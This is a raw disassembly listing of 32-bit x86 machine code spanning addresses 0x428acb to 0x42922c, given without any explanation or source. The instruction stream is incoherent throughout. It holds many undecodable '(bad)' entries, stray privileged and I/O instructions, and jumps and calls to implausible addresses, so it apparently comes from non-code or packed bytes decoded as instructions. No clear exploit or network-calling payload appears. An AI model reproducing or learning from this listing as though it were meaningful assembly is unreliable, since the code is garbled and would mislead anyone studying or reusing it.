  428acb:	add    edx,DWORD PTR [edi+0x74]
  428ace:	sbb    BYTE PTR [ebp+0x4d001484],cl
  428ad4:	add    BYTE PTR [ebp-0x74c48bbb],al
  428ada:	je     0x428a5f
  428adc:	cmp    eax,edi
  428ade:	js     0x428b03
  428ae0:	add    eax,0xeb0fc003
  428ae5:	jns    0x428a72
  428ae7:	vmread DWORD PTR [ecx+0x45],ebx
  428aeb:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  428af1:	adc    al,0x8b
  428af3:	jge    0x428b09
  428af5:	mov    edi,DWORD PTR [eax-0x4]
  428af8:	add    edi,DWORD PTR [edi]
  428afa:	or     bh,bh
  428afc:	push   ebp
  428afd:	push   es
  428afe:	mov    DWORD PTR [ebp-0x4],ebx
  428b01:	add    edi,esi
  428b03:	pop    es
  428b04:	add    esi,DWORD PTR [edi-0x48ccf183]
  428b0a:	mov    DWORD PTR [esp+esi*8],ecx
  428b0d:	inc    ebp
  428b0e:	pop    ebp
  428b0f:	xor    DWORD PTR [esi-0x4],0x3b
  428b13:	add    edx,DWORD PTR [ecx+edi*1]
  428b16:	push   es
  428b17:	clc    
  428b18:	mov    bh,0xdb
  428b1a:	jp     0x428ad3
  428b1c:	add    cl,BYTE PTR [esi]
  428b1e:	div    DWORD PTR [edi+0x4d8b0c1c]
  428b24:	test   edi,edi
  428b26:	je     0x428b1c
  428b28:	mov    eax,ecx
  428b2a:	or     BYTE PTR [ebx],al
  428b2c:	dec    BYTE PTR [ecx+0x7d3bec7d]
  428b32:	jbe    0x428ba6
  428b34:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  428b3a:	add    ecx,DWORD PTR [esi]
  428b3c:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  428b42:	add    eax,DWORD PTR [ebx-0x287af783]
  428b48:	je     0x428b97
  428b4a:	mov    DWORD PTR [ecx],edi
  428b4c:	mov    esi,eax
  428b4e:	hlt    
  428b4f:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  428b56:	jb     0x428b18
  428b58:	jmp    0x428b45
  428b5a:	xor    esi,DWORD PTR [ebx]
  428b5c:	pop    edi
  428b5d:	pop    esi
  428b5e:	pop    ebx
  428b5f:	ret    
  428b60:	ret    0x8b
  428b63:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  428b69:	cmp    DWORD PTR [eax],0xc
  428b6c:	pushf  
  428b6d:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  428b73:	(bad)  
  428b75:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  428b7c:	dec    ebp
  428b7d:	ret    
  428b7e:	mov    edi,DWORD PTR [esi-0x4]
  428b81:	pop    eax
  428b82:	dec    ebp
  428b83:	jne    0x428b10
  428b85:	xor    edi,esp
  428b87:	inc    eax
  428b88:	dec    ebp
  428b89:	jbe    0x428bde
  428b8b:	inc    eax
  428b8c:	pop    ebp
  428b8d:	add    edx,DWORD PTR [esi+0x8]
  428b90:	push   eax
  428b91:	dec    eax
  428b92:	push   ecx
  428b93:	mov    eax,edi
  428b95:	and    al,0xf0
  428b97:	jo     0x428b84
  428b99:	mov    eax,DWORD PTR [ebx]
  428b9b:	sbb    BYTE PTR [ebp+0x4d],cl
  428b9e:	mov    eax,DWORD PTR [ebx]
  428ba0:	nop
  428ba1:	or     BYTE PTR [eax],al
  428ba3:	jne    0x428bfc
  428ba5:	cmp    ebx,DWORD PTR [eax+0x33893277]
  428bab:	cld    
  428bac:	xor    edi,edi
  428bae:	add    edi,DWORD PTR [ebp+0x3]
  428bb1:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  428bb7:	js     0x428b3d
  428bb9:	jae    0x428bbd
  428bbb:	(bad)  
  428bbd:	xor    al,0x5d
  428bbf:	jmp    0x428b4c
  428bc1:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  428bc8:	fdecstp 
  428bca:	test   BYTE PTR [edi],ah
  428bcc:	add    bh,BYTE PTR [ebp+0x0]
  428bcf:	add    ebx,DWORD PTR [ebp-0x77]
  428bd2:	mov    edi,eax
  428bd4:	cmp    al,0x0
  428bd7:	adc    dh,BYTE PTR [ebx]
  428bd9:	jge    0x428bde
  428bdb:	mov    edi,DWORD PTR [ebx]
  428bdd:	jl     0x428bee
  428bdf:	clc    
  428be0:	dec    edi
  428be1:	jge    0x428be3
  428be3:	mov    eax,DWORD PTR [ebx]
  428be5:	jb     0x428bef
  428be7:	mov    ecx,DWORD PTR [ebp-0x8]
  428bea:	mov    edi,edi
  428bec:	xor    edx,DWORD PTR [eax]
  428bee:	add    edi,DWORD PTR [ebx]
  428bf0:	mov    DWORD PTR [ebp-0x10],edi
  428bf3:	inc    edi
  428bf4:	pop    ebp
  428bf5:	jge    0x428c32
  428bf7:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  428bfb:	mov    edx,0xc05d87f0
  428c00:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  428c04:	fimul  WORD PTR [eax]
  428c06:	fist   WORD PTR [ebp+0x1c]
  428c09:	in     al,dx
  428c0a:	jne    0x428bf8
  428c0c:	mov    edi,DWORD PTR [edx-0x7a27a10]
  428c12:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  428c16:	fdivp  st(0),st
  428c18:	fild   WORD PTR [ebp+0x4510f85c]
  428c1e:	test   BYTE PTR [ebx+0x4d00fc02],cl
  428c24:	inc    ebp
  428c25:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  428c2b:	mov    ebp,DWORD PTR [ebx-0x4]
  428c2e:	adc    al,0x8b
  428c30:	rcl    DWORD PTR [eax],0x48
  428c33:	mov    esi,0x7080803
  428c38:	fiadd  WORD PTR [ebp+0x4d]
  428c3b:	mov    cs,WORD PTR [ebx+0x558bfc52]
  428c41:	cld    
  428c42:	xor    ebx,DWORD PTR [ebx+0x330103]
  428c48:	mov    DWORD PTR [edi+0x872dc],edi
  428c4e:	xlat   BYTE PTR ds:[ebx]
  428c4f:	into   
  428c50:	ffreep st(6)
  428c52:	retf   0x6c7
  428c55:	iret   
  428c56:	dec    ebp
  428c57:	inc    ebp
  428c58:	mov    DWORD PTR [ebx],edi
  428c5a:	fmul   QWORD PTR [edi]
  428c5c:	dec    ebp
  428c5d:	jnp    0x428c92
  428c5f:	add    BYTE PTR [ebx],al
  428c61:	mov    ecx,DWORD PTR [esp+edi*8]
  428c64:	inc    ebp
  428c65:	dec    ebp
  428c66:	lea    esi,[ebx]
  428c68:	add    DWORD PTR [ebx],eax
  428c6a:	jb     0x428ca7
  428c6c:	add    BYTE PTR [edi],cl
  428c6e:	inc    ebp
  428c6f:	imul   eax,edi,0x858bd800
  428c75:	cld    
  428c76:	clc    
  428c77:	mov    DWORD PTR [ebp+0x0],eax
  428c7a:	inc    DWORD PTR [eax]
  428c7c:	or     al,0xde
  428c7e:	sbb    bh,0x1
  428c81:	retf   
  428c82:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  428c89:	dec    ebp
  428c8a:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  428c90:	enter  0x12de,0xdf
  428c94:	inc    ebp
  428c95:	pop    ebp
  428c96:	dec    DWORD PTR [ebx-0x257f0ff4]
  428c9c:	add    DWORD PTR [edx],edx
  428c9e:	add    BYTE PTR [ebp+0x50],dl
  428ca1:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  428ca7:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  428cad:	or     ah,al
  428caf:	pop    ss
  428cb0:	cdq    
  428cb1:	push   ebp
  428cb2:	clc    
  428cb3:	mov    eax,DWORD PTR [ebp-0x4]
  428cb6:	xor    edx,edx
  428cb8:	add    esi,DWORD PTR [ebx]
  428cba:	cmp    eax,DWORD PTR [ebx]
  428cbc:	hlt    
  428cbd:	cmp    DWORD PTR [ebx],esp
  428cbf:	or     al,BYTE PTR [ebp+0xf]
  428cc2:	mov    eax,DWORD PTR [edx]
  428cc4:	loopne 0x428cc6
  428cc6:	(bad)  
  428cc7:	mov    ecx,esi
  428cc9:	cld    
  428cca:	pushf  
  428ccb:	pop    ebp
  428ccc:	cwde   
  428ccd:	mov    esi,DWORD PTR [edx]
  428ccf:	lock mov eax,eax
  428cd2:	adc    BYTE PTR [ebx],al
  428cd4:	or     BYTE PTR [ebx+0x4d001001],0xcf
  428cdb:	xor    ebp,DWORD PTR [edi+0x50e45189]
  428ce1:	dec    ebp
  428ce2:	mov    ecx,DWORD PTR [ebx-0x31390304]
  428ce8:	(bad)  
  428ce9:	iret   
  428cea:	inc    ebp
  428ceb:	(bad)  
  428cec:	jne    0x428d3b
  428cee:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  428cf4:	(bad)  
  428cf5:	cmp    ebx,eax
  428cf7:	je     0x428c7f
  428cf9:	add    edi,edi
  428cfb:	or     bh,bh
  428cfd:	dec    ebp
  428cfe:	inc    ebp
  428cff:	mov    esi,DWORD PTR [ebx]
  428d01:	cld    
  428d02:	add    ecx,esi
  428d04:	cmp    ecx,DWORD PTR [eax-0xc]
  428d07:	mov    edx,DWORD PTR [edi]
  428d09:	or     BYTE PTR [ebp-0x7c],al
  428d0c:	mov    ebx,DWORD PTR [eax-0x7639cd18]
  428d12:	test   BYTE PTR [eax+ebx*4],cl
  428d15:	inc    ebp
  428d16:	xor    bh,BYTE PTR ds:0x8be89c89
  428d1c:	out    dx,eax
  428d1d:	adc    BYTE PTR [eax],al
  428d1f:	jne    0x428ce8
  428d21:	mov    ebp,esp
  428d23:	fcomp  DWORD PTR [ebx]
  428d25:	add    BYTE PTR [ecx],al
  428d27:	inc    DWORD PTR [ebp-0x75]
  428d2a:	mov    ?,esp
  428d2c:	add    al,0xce
  428d2e:	mov    ecx,edi
  428d30:	cld    
  428d31:	inc    ebp
  428d32:	fidivr WORD PTR [ebx]
  428d34:	fbstp  TBYTE PTR [ebp-0x3e]
  428d37:	mov    eax,DWORD PTR [eax]
  428d39:	adc    BYTE PTR [ebx-0x3974038b],cl
  428d3f:	fadd   st,st(7)
  428d41:	add    BYTE PTR [ebp-0x1],al
  428d44:	mov    ecx,DWORD PTR [esp+edi*8]
  428d47:	inc    ebp
  428d48:	mov    bh,0xc7
  428d4b:	loopne 0x428d92
  428d4d:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  428d53:	add    DWORD PTR [ebx],esi
  428d55:	pushf  
  428d56:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  428d5c:	mov    eax,edi
  428d5e:	cwde   
  428d5f:	inc    ebp
  428d60:	inc    ebp
  428d61:	jne    0x428cee
  428d63:	mov    esp,esp
  428d65:	clc    
  428d66:	add    al,0x4d
  428d68:	mov    DWORD PTR [ebx],esi
  428d6a:	or     al,0x33
  428d6c:	inc    ebp
  428d6d:	lea    ecx,[ebx-0x398d13fd]
  428d73:	add    bh,al
  428d75:	inc    ebp
  428d76:	ror    DWORD PTR [ebx+0x45d829],0x8b
  428d7d:	add    ebp,esp
  428d7f:	shufps xmm1,xmm3,0xc7
  428d83:	(bad)  
  428d84:	jmp    0x7487c8ad
  428d89:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  428d8f:	hlt    
  428d90:	mov    ecx,DWORD PTR [edi]
  428d92:	fadd   DWORD PTR [ebp+0x0]
  428d95:	xor    ecx,DWORD PTR [edi]
  428d97:	add    ecx,ecx
  428d99:	cmp    edi,edi
  428d9b:	pmuludq mm7,QWORD PTR [edx+0x50]
  428d9f:	(bad)  
  428da0:	jmp    0x428d2d
  428da2:	mov    edi,esp
  428da4:	or     al,0xc6
  428da6:	inc    ebp
  428da7:	(bad)  
  428da8:	mov    eax,DWORD PTR [ebp+0x10]
  428dab:	jne    0x428d36
  428dad:	mov    eax,DWORD PTR [ecx]
  428daf:	clc    
  428db0:	add    BYTE PTR [ebp-0x40],cl
  428db3:	xor    edx,DWORD PTR [eax-0x73]
  428db6:	jne    0x428db9
  428db8:	push   DWORD PTR [edx+0x8]
  428dbb:	add    BYTE PTR [ebp+0x45],al
  428dbe:	mov    ebp,ecx
  428dc0:	cld    
  428dc1:	add    BYTE PTR [ebp+0x0],cl
  428dc4:	xor    eax,DWORD PTR [ebp+0x3]
  428dc7:	mov    al,0x3b
  428dc9:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  428dcf:	sub    eax,0x5d330e4d
  428dd4:	lea    esi,[ebx]
  428dd6:	add    DWORD PTR [ebx],eax
  428dd8:	jb     0x428dc3
  428dda:	add    BYTE PTR [eax],al
  428ddc:	inc    ebp
  428ddd:	add    bl,ch
  428ddf:	inc    ebp
  428de0:	mov    esi,DWORD PTR [ebx]
  428de2:	or     al,0x3
  428de4:	(bad)  
  428de5:	mov    edi,eax
  428de7:	in     al,dx
  428de8:	scas   eax,DWORD PTR es:[edi]
  428de9:	inc    ebp
  428dea:	mov    esi,DWORD PTR [ebx]
  428dec:	in     al,0x3
  428dee:	add    al,0x89
  428df0:	mov    ecx,DWORD PTR [eax+edi*8]
  428df3:	dec    ebp
  428df4:	(bad)  
  428df5:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3168]
  428dfc:	mov    ecx,eax
  428dfe:	cld    
  428dff:	push   es
  428e00:	dec    ebp
  428e01:	add    al,0x33
  428e03:	mov    DWORD PTR [ebx],eax
  428e05:	in     al,dx
  428e06:	cmp    DWORD PTR [ebp-0x67],eax
  428e09:	mov    eax,DWORD PTR [ebp-0xba0068]
  428e0f:	mov    edx,DWORD PTR [ebp-0x4]
  428e12:	mov    ecx,DWORD PTR [ebp-0x18]
  428e15:	xor    ecx,DWORD PTR [ebp+0x3]
  428e18:	cmp    DWORD PTR [ebx],0x8b327497
  428e1e:	xor    edi,esp
  428e20:	jmp    0xff768b72
  428e25:	add    ecx,DWORD PTR [ebp-0x3f]
  428e28:	xor    ebx,DWORD PTR [edi]
  428e2a:	add    eax,ecx
  428e2c:	cmp    ebx,DWORD PTR [eax]
  428e2e:	mov    ecx,DWORD PTR [ebp-0x4]
  428e31:	mov    ecx,DWORD PTR [eax]
  428e33:	adc    BYTE PTR [ebp-0x80],al
  428e36:	jmp    0x428e39
  428e38:	mov    eax,DWORD PTR [eax]
  428e3a:	cld    
  428e3b:	mov    bh,0xc6
  428e3d:	push   ecx
  428e3e:	(bad)  
  428e3f:	jne    0x428e9f
  428e41:	dec    ecx
  428e43:	or     BYTE PTR [ecx+ebx*1],cl
  428e46:	push   ebp
  428e47:	inc    ebp
  428e48:	in     al,dx
  428e49:	add    ebp,esp
  428e4b:	or     bh,al
  428e4d:	dec    ebp
  428e4e:	cld    
  428e4f:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  428e55:	cmp    DWORD PTR [ecx],0x2
  428e58:	pushf  
  428e59:	dec    DWORD PTR [ebx+0x45510cf4]
  428e5f:	mov    DWORD PTR [ebx+0x5045fc0c],ecx
  428e65:	mov    edx,DWORD PTR [ecx+0xc]
  428e68:	xor    eax,esi
  428e6a:	mov    edx,0xc172c7
  428e6f:	inc    ebp
  428e70:	mov    esi,DWORD PTR [ebp+0x8]
  428e73:	mov    eax,edx
  428e75:	call   0x84c7556a
  428e7a:	add    DWORD PTR [eax-0x76bace00],ebx
  428e80:	mov    ebp,eax
  428e82:	or     BYTE PTR [eax],dl
  428e84:	jo     0x428ed3
  428e86:	push   edi
  428e87:	xor    esi,DWORD PTR [ebp+0x3]
  428e8a:	(bad)  
  428e8b:	pmulhuw mm0,mm1
  428e8e:	test   DWORD PTR [ebp-0x8],ecx
  428e91:	mov    DWORD PTR [ebp-0x67],eax
  428e94:	mov    eax,DWORD PTR [ebp-0x4]
  428e97:	xor    edi,DWORD PTR [ebp-0x73]
  428e9a:	xor    eax,DWORD PTR [ebx]
  428e9c:	xor    esi,DWORD PTR [edx+0x3]
  428e9f:	add    BYTE PTR [ecx],bh
  428ea1:	inc    ebp
  428ea2:	(bad)  
  428ea3:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  428ea9:	mov    DWORD PTR [eax],0x750f0004
  428eaf:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  428eb5:	lock add BYTE PTR [ebp+0x0],al
  428eb9:	mov    esi,DWORD PTR [ebp-0x2c]
  428ebc:	mov    ebp,edx
  428ebe:	or     al,0x72
  428ec0:	ja     0x428ec2
  428ec2:	mov    edx,esi
  428ec4:	cld    
  428ec5:	(bad)  
  428ec8:	cli    
  428ec9:	mov    esi,DWORD PTR [ebp-0x4]
  428ecc:	cmp    ecx,esi
  428ece:	bswap  edi
  428ed0:	(bad)
  428ed4:	mov    esi,DWORD PTR [ebp-0x4]
  428ed7:	mov    esi,ecx
  428ed9:	clc    
  428eda:	repnz add esi,DWORD PTR [ebp+0x45]
  428ede:	push   ebx
  428edf:	xor    eax,DWORD PTR [ebp+0x3]
  428ee2:	cmp    ebx,DWORD PTR [edi-0x64]
  428ee5:	pop    ebx
  428ee6:	jmp    0x428fad
  428eeb:	mov    esi,DWORD PTR [ebp-0x7d]
  428eee:	xor    ebp,DWORD PTR [eax]
  428ef0:	lea    eax,[ebp-0x8]
  428ef3:	cmp    dl,dh
  428ef5:	pushf  
  428ef6:	out    dx,eax
  428ef7:	(bad)  
  428ef8:	neg    eax
  428efa:	ins    DWORD PTR es:[edi],dx
  428efb:	test   esi,edi
  428efd:	clc    
  428efe:	pop    esp
  428eff:	inc    ebp
  428f00:	or     BYTE PTR [ecx+0x450f0c7d],cl
  428f06:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  428f0c:	add    cl,al
  428f0e:	jne    0x428ea8
  428f10:	mov    esi,DWORD PTR [edx]
  428f12:	in     al,dx
  428f13:	push   esi
  428f14:	xor    BYTE PTR [ebp-0xe],dh
  428f17:	add    edi,esi
  428f19:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  428f1f:	add    cl,bh
  428f21:	mov    edi,DWORD PTR [ebp+0x8]
  428f24:	mov    DWORD PTR [ebp-0x14],esi
  428f27:	add    esi,DWORD PTR [ebp+0x3c]
  428f2a:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  428f30:	mov    ah,0x3d
  428f32:	cwde   
  428f33:	pushf  
  428f34:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  428f3a:	jne    0x428ec7
  428f3c:	mov    ecx,DWORD PTR [esp+ebp*8]
  428f3f:	icebp  
  428f40:	icebp  
  428f41:	shl    edx,0xf2
  428f44:	(bad)  
  428f45:	mov    ah,0x16
  428f47:	cmp    BYTE PTR [ebp-0x6d],dh
  428f4a:	mov    ecx,DWORD PTR [edi]
  428f4c:	in     al,dx
  428f4d:	jmp    0x428f40
  428f4f:	add    dl,dh
  428f51:	mov    edi,esi
  428f53:	or     al,0x8
  428f55:	inc    ebp
  428f56:	jne    0x428f5b
  428f58:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  428f5e:	ret    
  428f5f:	or     bh,bh
  428f61:	jge    0x428f4b
  428f63:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  428f69:	xor    edi,eax
  428f6b:	add    esi,DWORD PTR [ebp-0x77]
  428f6e:	mov    ebx,esp
  428f70:	clc    
  428f71:	neg    DWORD PTR [ebp-0x7c]
  428f74:	xor    eax,DWORD PTR [eax]
  428f76:	cmp    eax,DWORD PTR [eax]
  428f78:	repz jne 0x428f10
  428f7b:	xor    eax,DWORD PTR [ecx]
  428f7d:	add    ebx,DWORD PTR [eax]
  428f7f:	mov    DWORD PTR [ebp-0x8],eax
  428f82:	mov    eax,edi
  428f84:	cld    
  428f85:	lock pop eax
  428f87:	test   DWORD PTR [ebx],esi
  428f89:	clc    
  428f8a:	add    edx,DWORD PTR [edi-0x740bff77]
  428f90:	fdivp  st(4),st
  428f92:	test   ecx,esi
  428f94:	(bad)  
  428f95:	jnp    0x428f96
  428f97:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  428f9d:	jae    0x428f2a
  428f9f:	sub    edi,esp
  428fa1:	(bad)  
  428fa2:	shl    DWORD PTR [eax-0x3e],0x89
  428fa6:	leave  
  428fa7:	call   0x819846b4
  428fac:	in     al,dx
  428fad:	(bad)  
  428fae:	in     al,dx
  428faf:	add    bh,al
  428fb1:	mov    esp,edi
  428fb3:	in     al,dx
  428fb4:	test   DWORD PTR [ebp-0x8],edi
  428fb7:	mov    eax,DWORD PTR [ebp+0x2b]
  428fba:	cmp    DWORD PTR [ebx],eax
  428fbc:	pushf  
  428fbd:	jnp    0x57318bf6
  428fc3:	xor    edx,DWORD PTR [eax-0x77]
  428fc6:	push   ecx
  428fc7:	loopne 0x428ffc
  428fc9:	jne    0x428f86
  428fcb:	mov    esi,DWORD PTR [edx-0x20]
  428fce:	add    BYTE PTR [ebp-0x3d],bh
  428fd1:	xor    eax,DWORD PTR [ebp-0x73]
  428fd4:	mov    edi,DWORD PTR [esi]
  428fd6:	cld    
  428fd7:	jb     0x428f9f
  428fd9:	add    bl,al
  428fdb:	jne    0x429022
  428fdd:	mov    edx,DWORD PTR [edi-0x10]
  428fe0:	jge    0x42905f
  428fe2:	mov    esi,DWORD PTR [ebx]
  428fe4:	lock add ecx,DWORD PTR [ebp+0x3b]
  428fe8:	xor    esi,DWORD PTR [ebp-0x77]
  428feb:	mov    esi,eax
  428fed:	lock inc ebp
  428fef:	jge    0x429029
  428ff1:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  428ff8:	dec    ebp
  428ff9:	mov    esi,DWORD PTR [ebx]
  428ffb:	loopne 0x428f86
  428ffd:	jge    0x428ff7
  428fff:	add    DWORD PTR [ebp-0x7d],eax
  429002:	clc    
  429003:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  42900a:	dec    ebp
  42900b:	hlt    
  42900c:	xor    ebx,DWORD PTR [ebp-0x77]
  42900f:	mov    esi,esp
  429011:	in     al,0x45
  429013:	jge    0x429051
  429015:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  42901c:	dec    ebp
  42901d:	cmp    al,0x33
  42901f:	xchg   ebx,eax
  429020:	mov    DWORD PTR [ebx-0x14],esi
  429023:	add    eax,DWORD PTR [ebp-0xc]
  429026:	cmp    BYTE PTR [ebp-0x61],dh
  429029:	mov    edi,DWORD PTR [eax+0xf19504]
  42902f:	repnz mov DWORD PTR [ebp+0x20],ebx
  429033:	cmp    eax,DWORD PTR [ebp+0xf]
  429036:	test   DWORD PTR [edi+ecx*1-0x1],edx
  42903a:	fistp  WORD PTR [ebx+0x0]
  42903d:	inc    ebp
  42903e:	mov    ebx,DWORD PTR [edi+0xc]
  429041:	add    eax,eax
  429043:	inc    ebp
  429044:	test   BYTE PTR [ebx],dh
  429046:	add    eax,DWORD PTR [ebx]
  429048:	add    BYTE PTR [esi+0x45],bl
  42904b:	ret    0x85
  42904e:	jnp    0x5443141d
  429054:	inc    bp
  429056:	inc    ebp
  429057:	cmp    BYTE PTR [ecx+0xc78a9c],bh
  42905d:	fdiv   QWORD PTR [ebx]
  42905f:	test   DWORD PTR [ecx+0x453af8],edi
  429065:	push   ebx
  429066:	add    edi,DWORD PTR [esi+0x708088b]
  42906c:	cmp    esi,eax
  42906e:	sets   BYTE PTR [ecx-0x74fcffce]
  429075:	mov    esp,edi
  429077:	call   0x33cdd5c9
  42907c:	or     BYTE PTR [ebx],al
  42907e:	inc    ecx
  42907f:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  429085:	and    BYTE PTR [ebp-0x7074f0bb],al
  42908b:	lock add cl,al
  42908e:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  429095:	mov    ch,0x45
  429097:	clc    
  429098:	xor    eax,DWORD PTR [ebp+0x3]
  42909b:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4290a1:	inc    ebp
  4290a2:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4290a8:	mov    edi,eax
  4290aa:	mov    eax,DWORD PTR [ebp+0x3c]
  4290ad:	mov    ecx,DWORD PTR [eax]
  4290af:	hlt    
  4290b0:	inc    ebp
  4290b1:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4290b8:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4290be:	push   ebp
  4290bf:	mov    edi,DWORD PTR [ebx]
  4290c1:	in     al,dx
  4290c2:	jne    0x429085
  4290c4:	mov    eax,DWORD PTR [ebp-0x28]
  4290c7:	add    DWORD PTR [eax],0xe8058dec
  4290cd:	clc    
  4290ce:	mov    esp,DWORD PTR [edi-0x8]
  4290d1:	add    dh,dl
  4290d3:	rol    WORD PTR [ebp-0x1],cl
  4290d7:	mov    edx,DWORD PTR [eax+0x8]
  4290da:	jne    0x42909c
  4290dc:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4290e3:	inc    ebp
  4290e4:	push   esp
  4290e5:	test   DWORD PTR [ecx+0xf],ecx
  4290e8:	sub    edx,esp
  4290ea:	add    eax,DWORD PTR [eax]
  4290ec:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4290f2:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  4290f9:	mov    eax,DWORD PTR [ecx]
  4290fb:	and    BYTE PTR [eax],al
  4290fd:	adc    BYTE PTR ss:[eax],al
  429100:	inc    ebp
  429101:	inc    cx
  429104:	push   esp
  429105:	cld    
  429106:	jne    0x429108
  429108:	push   edx
  429109:	enterw 0xc1,0x4d
  42910e:	mov    esp,DWORD PTR [esi+0x20]
  429111:	add    DWORD PTR [ecx-0x7b],eax
  429114:	add    eax,DWORD PTR [ebx]
  429116:	str    WORD PTR [eax+0x45]
  42911a:	lea    ecx,[ebx+0x45890801]
  429120:	sbb    BYTE PTR [ebx],al
  429122:	dec    ebp
  429123:	cmp    al,0xf
  429125:	inc    ebp
  429126:	push   eax
  429127:	mov    esi,DWORD PTR [ebx]
  429129:	push   eax
  42912a:	add    eax,eax
  42912c:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  429133:	inc    ebp
  429134:	add    BYTE PTR [eax],bh
  429136:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  42913d:	(bad)  
  42913e:	mov    ebx,eax
  429140:	loopne 0x429187
  429142:	dec    ebp
  429143:	mov    ecx,DWORD PTR [edi]
  429145:	cld    
  429146:	push   eax
  429147:	xchg   DWORD PTR [ebx],esi
  429149:	add    DWORD PTR [ebx],ebp
  42914b:	add    BYTE PTR [ebx],ch
  42914d:	or     BYTE PTR [ecx],bh
  42914f:	dec    ecx
  429150:	loopne 0x429155
  429152:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  429158:	push   ebp
  429159:	add    DWORD PTR [ebx+0x55100800],eax
  42915f:	dec    ebp
  429160:	jmp    0x4290eb
  429162:	mov    esp,DWORD PTR [eax]
  429164:	sbb    dl,dl
  429166:	inc    eax
  429167:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  42916d:	add    BYTE PTR [ebx+0x74528555],cl
  429173:	push   ebp
  429174:	div    DWORD PTR [ebx]
  429176:	and    eax,DWORD PTR [ebx]
  429178:	add    edx,DWORD PTR [edx-0x30]
  42917b:	jno    0x429108
  42917d:	inc    DWORD PTR [eax+eiz*1]
  429180:	inc    ebp
  429181:	push   eax
  429182:	push   eax
  429183:	mov    esp,DWORD PTR [edi-0x74beff1c]
  429189:	mov    edi,esp
  42918b:	push   eax
  42918c:	inc    ebp
  42918d:	enter  0x458b,0x8
  429191:	push   ecx
  429192:	(bad)  
  429193:	call   0x10c9b6b
  429198:	pop    ss
  429199:	push   ebp
  42919a:	mov    ecx,DWORD PTR [ebx+0x489408]
  4291a0:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4291a6:	push   ecx
  4291a7:	jo     0x429191
  4291a9:	inc    DWORD PTR [edi]
  4291ab:	or     BYTE PTR [eax],al
  4291ad:	call   0xcd98f7
  4291b2:	fmul   QWORD PTR [ebp+0x55]
  4291b5:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4291bb:	mov    bh,0x8c
  4291bd:	adc    al,0x98
  4291bf:	dec    esp
  4291c0:	xor    bl,BYTE PTR [eax]
  4291c2:	mov    ecx,DWORD PTR [ebp+0xc]
  4291c5:	mov    eax,DWORD PTR [ebp-0x4]
  4291c8:	mov    esi,DWORD PTR [edi-0x3148f924]
  4291ce:	push   es
  4291cf:	retf   
  4291d0:	mov    BYTE PTR [ebp-0x30],0x3b
  4291d4:	inc    ebp
  4291d5:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4291dc:	retf   0x83fc
  4291df:	into   
  4291e0:	dec    ebp
  4291e1:	retf   
  4291e2:	mov    ecx,DWORD PTR [ebp-0x74]
  4291e5:	mov    eax,DWORD PTR [eax]
  4291e7:	fdiv   QWORD PTR [ebx]
  4291e9:	mov    bh,0x3
  4291eb:	push   es
  4291ec:	mov    esi,ecx
  4291ee:	sbb    cl,dl
  4291f0:	dec    ebp
  4291f1:	sar    DWORD PTR [ebx],cl
  4291f3:	push   ebp
  4291f4:	jne    0x429205
  4291f6:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4291fc:	lea    ebx,[eax]
  4291fe:	call   0xf4cc1dc5
  429203:	sbb    dh,dl
  429205:	add    edx,ebx
  429207:	push   ebp
  429208:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  42920e:	push   ecx
  42920f:	mov    DWORD PTR [eax-0x30],edx
  429212:	test   DWORD PTR [edx],eax
  429214:	xadd   esp,esi
  429217:	pop    es
  429218:	add    cl,dl
  42921a:	mov    eax,ecx
  42921c:	or     al,0x45
  42921e:	(bad)  
  42921f:	push   eax
  429220:	add    DWORD PTR [edx+0x0],eax
  429223:	add    ecx,DWORD PTR [ecx]
  429225:	and    dh,cl
  429227:	call   0xc69af7
  42922c:	add    DWORD PTR [ebp+0x0],edx
